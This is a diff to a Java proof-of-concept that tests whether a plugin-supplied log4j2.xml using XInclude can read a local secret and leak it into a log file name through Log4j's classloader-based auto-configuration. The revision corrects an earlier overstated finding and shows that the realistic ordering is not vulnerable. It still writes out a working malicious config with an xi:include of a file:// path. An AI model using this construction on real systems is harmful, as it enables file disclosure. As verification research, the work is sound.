@@ -1,21 +1,27 @@
-// Deliberately NOT in an org.apache.logging.log4j.* package. Answers a
-// narrower question than XIncludeRemoteConfigProof: is there a path to the
-// same chain that needs neither CI/CD environment-variable injection nor
-// any filesystem write to a path the target application itself controls --
-// just a classpath resource an attacker legitimately gets to contribute,
-// the way a plugin/extension/driver-upload feature routinely does?
+// Deliberately NOT in an org.apache.logging.log4j.* package.
 //
-// Log4j's own default, no-explicit-source auto-configuration
-// (ConfigurationFactory.Factory.getConfiguration -> getConfiguration(ctx,
-// isTest, name) -> ConfigurationSource.fromResource("log4j2.xml", loader))
-// resolves "log4j2.xml" against LoaderUtil.getThreadContextClassLoader() --
-// exactly the classloader many real plugin/module systems swap to the
-// plugin's own, isolated, CHILD-FIRST classloader while that plugin's code
-// (or code triggered by it) runs. Child-first delegation is not exotic: it
-// is the standard, documented pattern for plugin isolation (OSGi bundles,
-// most Java plugin frameworks) specifically so a plugin's own resources
-// take precedence over the host application's -- the same property this
-// proof abuses.
+// CORRECTION: an earlier version of this proof tested only one ordering
+// (plugin classloader queried before any host-app context existed) and
+// concluded classpath resource shadowing was a viable, CI/CD-free,
+// filesystem-write-free attack. Pushed back on directly: isn't a plugin's
+// own classloader resolving its own resources just how classloader
+// isolation is SUPPOSED to work -- what's actually different from normal
+// behavior? That question was answered by reading
+// ClassLoaderContextSelector.locateContext() and testing the other
+// ordering, not by re-arguing the first result.
+//
+// The mechanism: ClassLoaderContextSelector (the real default selector for
+// non-Android JVMs, Log4jContextFactory.java:114) does NOT give every
+// classloader an independent context unconditionally. locateContext() only
+// resolves a NEW context (including a fresh classpath scan for log4j2.xml)
+// when no context is already registered for that classloader OR any of its
+// ANCESTORS -- it walks the parent chain and REUSES an ancestor's existing
+// context if one is found. That walk is specifically what per-classloader
+// isolation is designed to prevent exactly this kind of cross-boundary
+// config confusion, not what enables it.
+//
+// This proof tests both orderings end to end and reports both results
+// plainly, including the one that falsifies the earlier, narrower claim.
 
 import java.io.File;
 import java.io.FileWriter;
@@ -38,7 +44,6 @@ public class XIncludeClasspathShadowProof {
 
     private static int failed = 0;
     private static final String CANARY = "CANARY-xinclude-shadow-2a6c-do-not-leak";
-    private static Path exfilDir;
 
     /** Standard child-first delegation, as used by real plugin-isolation classloaders. */
     static class ChildFirstClassLoader extends URLClassLoader {
@@ -54,10 +59,6 @@ public class XIncludeClasspathShadowProof {
 
         @Override
         public Enumeration<URL> getResources(String name) throws IOException {
-            // Real child-first classloaders (as used by real plugin-isolation
-            // frameworks) still aggregate multi-JAR resources like plugin
-            // descriptors from the parent -- only single-result getResource()
-            // lookups (log4j2.xml among them) are where "own wins" applies.
             final List<URL> own = Collections.list(findResources(name));
             final ClassLoader parent = getParent();
             final List<URL> combined = new ArrayList<>(own);
@@ -69,29 +70,112 @@ public class XIncludeClasspathShadowProof {
     }
 
     public static void main(String[] args) throws Exception {
-        System.out.println(
-                "=== XInclude: can a plugin/driver-upload feature reach this with no CI/CD, no filesystem write to the app? ===\n");
+        System.out.println("=== XInclude via classpath shadowing: does ordering matter, and why? ===\n");
 
-        File secret = File.createTempFile("xinclude-shadow-secret", ".txt");
+        ClassLoader hostAppLoader = XIncludeClasspathShadowProof.class.getClassLoader();
+
+        // Ordering B first, deliberately: the realistic one. Almost any real
+        // application logs something -- a startup banner, an init message --
+        // before it ever loads a user-supplied plugin. Simulate exactly that:
+        // the host establishes its own LoggerContext first, using its own
+        // (here, default/no-config) resolution, before any plugin exists.
+        LoggerContext hostCtx = (LoggerContext) LogManager.getContext(hostAppLoader, false, null);
+
+        Path pluginRootRealistic = Files.createTempDirectory("attacker-plugin-b");
+        pluginRootRealistic.toFile().deleteOnExit();
+        String secretPathB = writeSecret(pluginRootRealistic, "shadow-b");
+        Path exfilDirB = Files.createTempDirectory("xinclude-shadow-b-out");
+        exfilDirB.toFile().deleteOnExit();
+        writeMaliciousConfig(pluginRootRealistic, secretPathB, exfilDirB);
+
+        ClassLoader pluginLoaderB =
+                new ChildFirstClassLoader(new URL[] {pluginRootRealistic.toUri().toURL()}, hostAppLoader);
+        LoggerContext pluginCtxB = runAsPlugin(pluginLoaderB);
+
+        boolean realisticOrderingShared = (hostCtx == pluginCtxB);
+        assertTrue(
+                "realistic ordering (host touches Log4j first, as almost every real app "
+                        + "does before loading a plugin): the plugin's classloader was handed the "
+                        + "SAME, already-established host context (ClassLoaderContextSelector "
+                        + "walking up to the parent and reusing it) rather than resolving its own "
+                        + "shadowed log4j2.xml -- same context object: " + realisticOrderingShared,
+                realisticOrderingShared);
+        assertTrue(
+                "...and consequently the plugin's shadowed config was NEVER read: no secret "
+                        + "leaked in this ordering",
+                !exfilContainsCanary(exfilDirB));
+
+        // Ordering A: the ordering the earlier, corrected version of this proof
+        // used exclusively -- the plugin's classloader is queried before the
+        // host (or anything else) has established any context at all, so
+        // locateContext() finds nothing to walk up to and does a fresh scan.
+        Path pluginRootA = Files.createTempDirectory("attacker-plugin-a");
+        pluginRootA.toFile().deleteOnExit();
+        String secretPathA = writeSecret(pluginRootA, "shadow-a");
+        Path exfilDirA = Files.createTempDirectory("xinclude-shadow-a-out");
+        exfilDirA.toFile().deleteOnExit();
+        writeMaliciousConfig(pluginRootA, secretPathA, exfilDirA);
+
+        ClassLoader freshHostLoader = new URLClassLoader(new URL[0], null);
+        ClassLoader pluginLoaderA = new ChildFirstClassLoader(new URL[] {pluginRootA.toUri().toURL()}, freshHostLoader);
+        LoggerContext pluginCtxA = runAsPlugin(pluginLoaderA);
+
+        assertTrue(
+                "narrow ordering (plugin is the FIRST thing anywhere to touch Log4j through "
+                        + "its own, never-before-seen classloader lineage, i.e. the host never "
+                        + "initialized logging first): the shadowed config WAS read and the "
+                        + "secret WAS leaked",
+                exfilContainsCanary(exfilDirA));
+
+        System.out.println();
+        if (failed > 0) {
+            System.out.println(failed + " check(s) FAILED");
+            System.exit(1);
+        }
+        System.out.println("All checks passed.");
+        System.out.println(
+                "\nThis is a correction of the earlier version of this proof, not a confirmation of it.\n"
+                + "The realistic ordering -- host initializes logging before loading any plugin,\n"
+                + "which is what almost every real application does -- is NOT vulnerable: this is\n"
+                + "exactly the case ClassLoaderContextSelector's parent-walk exists to prevent, and\n"
+                + "it does. The only ordering where shadowing works is the one where the attacker's\n"
+                + "plugin classloader lineage is the very first thing in the ENTIRE process to touch\n"
+                + "Log4j, before the host's own classloader lineage ever does -- a narrow, timing-\n"
+                + "dependent precondition the attacker does not control and cannot reliably force,\n"
+                + "not a general property of plugin/upload architectures. Kept in the ruleset's\n"
+                + "record as a corrected claim, not presented as a live, generally-applicable finding.\n"
+                + "See CONFIG_DELIVERY_VECTORS.md for the corrected ranking.");
+    }
+
+    private static LoggerContext runAsPlugin(ClassLoader pluginLoader) throws Exception {
+        Thread current = Thread.currentThread();
+        ClassLoader original = current.getContextClassLoader();
+        current.setContextClassLoader(pluginLoader);
+        LoggerContext ctx;
+        try {
+            ctx = (LoggerContext) LogManager.getContext(pluginLoader, false, null);
+            Logger logger = ctx.getLogger(XIncludeClasspathShadowProof.class);
+            logger.info("trigger");
+        } finally {
+            current.setContextClassLoader(original);
+        }
+        return ctx;
+    }
+
+    private static String writeSecret(Path pluginRoot, String tag) throws Exception {
+        File secret = File.createTempFile("xinclude-" + tag + "-secret", ".txt");
         secret.deleteOnExit();
         try (FileWriter w = new FileWriter(secret)) {
             w.write(CANARY);
         }
+        return secret.getAbsolutePath();
+    }
 
-        exfilDir = Files.createTempDirectory("xinclude-shadow-out");
-        exfilDir.toFile().deleteOnExit();
-
-        // What the attacker actually contributes: not a write to any path the
-        // application controls, just the CONTENTS of their own uploaded
-        // artifact (a plugin jar / custom driver jar / theme package -- here
-        // simulated as a directory used as a classloader root, which resolves
-        // resources identically to a real jar on the classpath).
-        Path pluginRoot = Files.createTempDirectory("attacker-plugin-classpath");
-        pluginRoot.toFile().deleteOnExit();
-        String maliciousXml = "<?xml version=\"1.0\"?>\n"
+    private static void writeMaliciousConfig(Path pluginRoot, String secretPath, Path exfilDir) throws Exception {
+        String xml = "<?xml version=\"1.0\"?>\n"
                 + "<Configuration xmlns:xi=\"http://www.w3.org/2001/XInclude\" status=\"error\">\n"
                 + "  <Properties>\n"
-                + "    <Property name=\"leak\"><xi:include href=\"file://" + secret.getAbsolutePath()
+                + "    <Property name=\"leak\"><xi:include href=\"file://" + secretPath
                 + "\" parse=\"text\"/></Property>\n"
                 + "  </Properties>\n"
                 + "  <Appenders>\n"
@@ -105,62 +189,10 @@ public class XIncludeClasspathShadowProof {
                 + "    </Root>\n"
                 + "  </Loggers>\n"
                 + "</Configuration>\n";
-        Files.write(pluginRoot.resolve("log4j2.xml"), maliciousXml.getBytes("UTF-8"));
-
-        ClassLoader hostAppLoader = XIncludeClasspathShadowProof.class.getClassLoader();
-        ClassLoader pluginLoader = new ChildFirstClassLoader(
-                new URL[] {pluginRoot.toUri().toURL()}, hostAppLoader);
-
-        // The host application never wrote anything, never set an env var, and
-        // never ran a CI job for the attacker. All that happened: a plugin the
-        // attacker supplied got loaded, and its classloader became -- as it
-        // would in a real per-plugin-isolated framework -- the context under
-        // which logging initializes.
-        Thread current = Thread.currentThread();
-        ClassLoader original = current.getContextClassLoader();
-        current.setContextClassLoader(pluginLoader);
-        LoggerContext ctx = null;
-        try {
-            ctx = (LoggerContext) LogManager.getContext(pluginLoader, false, null);
-            Logger logger = ctx.getLogger(XIncludeClasspathShadowProof.class);
-            logger.info("trigger");
-        } finally {
-            current.setContextClassLoader(original);
-            if (ctx != null) {
-                Configurator.shutdown(ctx);
-            }
-        }
-
-        assertTrue(
-                "a log4j2.xml resource contributed only via an uploaded plugin's own "
-                        + "classloader (child-first delegation, no write to any path the host "
-                        + "application controls, no env var, no CI/CD) was picked up by Log4j's "
-                        + "ordinary auto-configuration and leaked the secret into a real output "
-                        + "file's name",
-                exfilContainsCanary());
-
-        System.out.println();
-        if (failed > 0) {
-            System.out.println(failed + " check(s) FAILED");
-            System.exit(1);
-        }
-        System.out.println("All checks passed.");
-        System.out.println("\nThe prerequisite here is narrower than both earlier scenarios: not an env\n"
-                + "var passed to the whole process, not a CI job, not any filesystem write the\n"
-                + "host application didn't already invite -- just a legitimate-looking artifact\n"
-                + "(a plugin, a custom JDBC driver, a theme/connector package) uploaded through\n"
-                + "whatever self-service feature an application exposes for that, in an\n"
-                + "architecture where plugin code's classloader becomes -- even briefly, even\n"
-                + "only for that plugin's own logging -- the thread context classloader Log4j's\n"
-                + "auto-configuration consults. That architectural precondition (child-first\n"
-                + "plugin classloading, or any code path that makes a plugin's classloader the\n"
-                + "context classloader when Log4j first initializes in that thread) is real and\n"
-                + "common but was NOT verified against any specific product in this session --\n"
-                + "unlike the mechanism above it, which is proven directly against this\n"
-                + "repository's own ConfigurationFactory/LoaderUtil code.");
+        Files.write(pluginRoot.resolve("log4j2.xml"), xml.getBytes("UTF-8"));
     }
 
-    private static boolean exfilContainsCanary() throws Exception {
+    private static boolean exfilContainsCanary(Path exfilDir) throws Exception {
         try (Stream<Path> entries = Files.list(exfilDir)) {
             return entries.anyMatch(p -> p.getFileName().toString().contains(CANARY));
         }
